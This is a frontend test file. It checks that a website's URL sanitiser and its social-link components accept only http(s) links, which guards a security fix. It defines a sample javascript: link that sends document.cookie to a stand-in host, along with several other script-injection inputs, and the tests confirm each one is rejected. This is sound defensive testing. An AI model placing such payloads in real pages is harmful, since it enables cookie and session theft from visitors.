import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { render, screen, fireEvent } from '@testing-library/react';
import { safeHttpUrl, openExternal } from '../../utils/safeUrl';
import { Social } from '../../models/Social';
import SocialTiles from '../../components/blocks/SocialTiles';
import Footer from '../../components/Layout/Footer';

vi.mock('../../contexts/LanguageContext', () => ({
  useLanguage: () => ({ t: (key: string, opts?: { defaultValue?: string }) => opts?.defaultValue ?? key, language: 'en' }),
}));

class NoopObserver {
  observe() {}
  unobserve() {}
  disconnect() {}
}

/**
 * Security M1 (LT-315): owner social links reached href and window.open with
 * no scheme check, so a `javascript:` link ran on every visitor who clicked
 * the icon. Only http(s) survives, and outside pages get no window.opener.
 */
const EVIL = "javascript:fetch('https://x.example/?c='+document.cookie)";

describe('safeHttpUrl', () => {
  it('keeps http and https links', () => {
    expect(safeHttpUrl('https://instagram.com/dana.studio')).toBe('https://instagram.com/dana.studio');
    expect(safeHttpUrl('  http://facebook.com/dana  ')).toBe('http://facebook.com/dana');
  });

  it.each([
    EVIL,
    'JavaScript:alert(1)',
    ' javascript:alert(1)',
    'java\tscript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox(1)',
    'instagram.com/dana',
    '//evil.example',
    '',
    null,
    undefined,
    42,
  ])('drops %s', (value) => {
    expect(safeHttpUrl(value)).toBeNull();
  });
});

describe('openExternal', () => {
  let open: ReturnType<typeof vi.spyOn>;
  beforeEach(() => { open = vi.spyOn(window, 'open').mockImplementation(() => null); });
  afterEach(() => open.mockRestore());

  it('opens an http(s) link in a new tab without an opener', () => {
    openExternal('https://tiktok.com/@dana');
    expect(open).toHaveBeenCalledWith('https://tiktok.com/@dana', '_blank', 'noopener,noreferrer');
  });

  it('opens nothing for a script link', () => {
    openExternal(EVIL);
    expect(open).not.toHaveBeenCalled();
  });
});

describe('owner social links on the site', () => {
  beforeEach(() => { vi.stubGlobal('ResizeObserver', NoopObserver); vi.stubGlobal('IntersectionObserver', NoopObserver); });
  afterEach(() => vi.unstubAllGlobals());

  it('the model keeps only http(s) links', () => {
    const social = Social.fromJSON({ instagram: EVIL, facebook: 'https://facebook.com/dana', x: 'data:text/html,hi', tiktok: 'tiktok' });
    expect(social).toMatchObject({ instagram: null, facebook: 'https://facebook.com/dana', x: null, tiktok: null });
    expect(Social.fromJSON(undefined).hasAnySocialLinks()).toBe(false);
  });

  it('social tiles drop a script link even when one reaches them', () => {
    render(<SocialTiles social={{ instagram: EVIL, facebook: 'https://facebook.com/dana', x: null, tiktok: null } as Social} />);
    const links = screen.getAllByRole('link');
    expect(links).toHaveLength(1);
    expect(links[0]).toHaveAttribute('href', 'https://facebook.com/dana');
    expect(links[0]).toHaveAttribute('rel', 'noopener noreferrer');
  });

  it('the footer shows no icon for a script link, and opens the others without an opener', () => {
    const open = vi.spyOn(window, 'open').mockImplementation(() => null);
    render(
      <Footer
        config={{ description: 'd' }}
        social={{ instagram: EVIL, facebook: 'https://facebook.com/dana', tiktok: null, x: null } as never}
        businessName="Z"
        logoImageName="l.png"
        appointmentsType={[]}
        websiteConfig={{} as never}
        layout="minimal"
      />
    );
    expect(screen.queryByLabelText('footer.social.follow.instagram')).toBeNull();
    fireEvent.click(screen.getByLabelText('footer.social.follow.facebook'));
    expect(open).toHaveBeenCalledWith('https://facebook.com/dana', '_blank', 'noopener,noreferrer');
    open.mockRestore();
  });
});
